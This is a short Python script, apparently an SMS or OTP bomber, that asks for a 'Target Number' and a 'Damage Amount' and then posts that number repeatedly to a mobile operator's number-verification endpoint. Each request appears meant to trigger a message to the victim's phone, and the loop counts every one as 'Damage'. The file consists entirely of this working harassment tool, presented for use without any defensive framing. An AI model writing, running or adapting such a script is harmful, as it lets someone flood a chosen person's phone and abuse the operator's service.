import requests
from requests.structures import CaseInsensitiveDict

url = "https://www.grameenphone.com/myoffers/verify-number/f37c4630c796617ace93e19c350c321e"

headers = CaseInsensitiveDict()
headers["Content-Type"]="application/x-www-form-urlencoded"

number=str(input("[>] Enter Your Target Number:"))

data = "anon_token=i3ChaPYahLQsCpEO9CyODb1OzNwy-DYqtSiNOk4ADc+&myoffer_msisdn="+number

amount = int(input("[>] Enter Your Damage Amount:"))

for i in range (amount):
	try:
		requests.post(url,headers=headers, data = data) 
		print(str (i+1)+" Damage \n")
	except:
		print("Server connection Failed!")